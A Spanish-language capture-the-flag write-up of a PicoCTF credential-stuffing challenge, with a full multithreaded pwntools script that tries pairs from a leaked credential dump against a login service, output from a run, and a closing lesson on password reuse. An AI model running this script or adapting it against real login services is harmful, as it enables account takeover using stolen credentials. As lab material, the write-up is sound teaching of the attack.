# Writeup: Credential_Stuffing
**Categoría:** Medium
**Fecha de conversión:** 2026-04-24

---

Writeup: Credential Stuffing Challenge (PicoCTF)

Descripción del reto


Se nos proporciona un archivo creds-dump.txt que contiene miles de pares usuario;contraseña filtrados de un ataque a una tienda departamental. El objetivo es probar si algún usuario reutilizó esas mismas credenciales en un banco local, al que podemos acceder mediante nc crystal-peak.picoctf.net <puerto>.


Al conectarnos, el servicio muestra un banner de bienvenida y solicita Username: y **Password**:. Si las credenciales son incorrectas, responde con Invalid username or password y cierra la conexión. Si son correctas, muestra un mensaje de autenticación exitosa y la flag.

### Análisis inicial


Primero, verificamos que el servicio esté activo:

bash


nc crystal-peak.picoctf.net 63322


El puerto puede variar; en este caso era el 63322. Obtenemos el banner y podemos probar una credencial cualquiera del dump, por ejemplo willette;concord, que falla.

Estrategia


Necesitamos probar cada par del archivo creds-dump.txt (no todas las combinaciones, porque el ataque de credential stuffing consiste en inyectar los pares robados exactos). Como hay 1500 credenciales, podemos hacerlo de forma concurrente con múltiples hilos para acelerar el proceso.

Herramientas utilizadas


```
    Python 3 con bibliotecas socket o pwntools. Elegimos pwntools por su facilidad para manejar diálogos de red.

    concurrent.futures.ThreadPoolExecutor para paralelizar las conexiones.

    threading.Event para detener todos los hilos en cuanto se encuentre la flag.

```

Script final


El script lee el archivo línea por línea, separa usuario y contraseña, y para cada par intenta el login. Si la respuesta contiene picoCTF{, se considera éxito y se muestra la flag. En caso contrario, se muestra el progreso cada 100 intentos.

python


```bash
#!/usr/bin/env python3
```

import concurrent.futures

import threading

from pwn import *


```bash
# Configuración
```

host = 'crystal-peak.picoctf.net'

port = 63322

filename = 'creds-dump.txt'

MAX_WORKERS = 30   # Número de hilos concurrentes


found_event = threading.Event()   # Para detener todos los hilos al encontrar la flag


def attempt_login(index, total, username, password):

```
    """Intenta autenticarse con un par de credenciales."""
    if found_event.is_set():
        return

    try:
        # Establecer conexión con timeout
        io = remote(host, port, level='error', timeout=3)

        # Esperar el prompt de Username y enviar el usuario
        io.recvuntil(b'Username: ', timeout=2)
        io.sendline(username.encode())

        # Esperar el prompt de Password y enviar la contraseña
        io.recvuntil(b'Password: ', timeout=2)
        io.sendline(password.encode())

        # Leer toda la respuesta (el servidor cierra la conexión tras responder)
        response = io.recvall(timeout=1)
        io.close()

        # Si la respuesta contiene la flag, éxito
        if b'picoCTF{' in response:
            found_event.set()
            print(f"\n[+] ============== SUCCESS ==============")
            print(f"[+] Attempt: {index}/{total}")
            print(f"[+] User: {username}")
            print(f"[+] Pass: {password}")
            print(f"[+] Response:\n{response.decode().strip()}")
            print(f"[+] =====================================")
            # Guardar la flag en un archivo
            with open('flag.txt', 'w') as f:
                f.write(response.decode())
        else:
            # Mostrar progreso cada 100 intentos fallidos
            if index % 100 == 0:
                print(f"[{index}/{total}] [-] Failed: {username}")
    except Exception as e:
        print(f"[{index}/{total}] [!] Error with {username}: {str(e)}")

```

def main():

```
    # Leer el archivo de credenciales
    try:
        with open(filename, 'r') as f:
            lines = f.readlines()
    except FileNotFoundError:
        print(f"[!] Error: '{filename}' not found.")
        return

    # Parsear líneas con formato "usuario;contraseña"
    creds = []
    for line in lines:
        line = line.strip()
        if not line or ';' not in line:
            continue
        u, p = line.split(';', 1)
        creds.append((u, p))

    total = len(creds)
    print(f"[*] Loaded {total} credentials.")
    print(f"[*] Starting attack with {MAX_WORKERS} threads...")
    print("-" * 40)

    # Usar ThreadPoolExecutor para gestionar los hilos
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        for i, (user, pwd) in enumerate(creds, start=1):
            futures.append(executor.submit(attempt_login, i, total, user, pwd))

        # Esperar a que terminen o se encuentre la flag
        concurrent.futures.wait(futures)

    print("\n[*] Process completed.")

```

if __name__ == '__main__':

```
    main()

```

Ejecución y resultados


Al ejecutar el script:

bash


python3 exploit.py


La salida muestra el progreso y, tras 212 intentos, encuentra la credencial válida:

text


[100/1500] [-] Failed: percy

[200/1500] [-] Failed: deann


## [+] ============== success ==============

[+] Attempt: 212/1500

[+] User: hayes

[+] Pass: farley

[+] Response:

farley

Authenticating...

Welcome hayes!

picoCTF{*******************************}

[+] =====================================


### Explicación de por qué funcionó


```
    Credential stuffing: El archivo creds-dump.txt contenía el par hayes:farley que coincidía con las credenciales del banco.

    Concurrencia: Usar 30 hilos permitió probar 1500 combinaciones en menos de un minuto.

    Detección correcta: El script buscaba explícitamente la cadena picoCTF{ en la respuesta, lo que evitó falsos positivos.

```

Lección de seguridad


Nunca reutilices contraseñas entre diferentes servicios. Un solo filtrado puede comprometer todas tus cuentas. Usa gestores de contraseñas y contraseñas únicas para cada sitio.

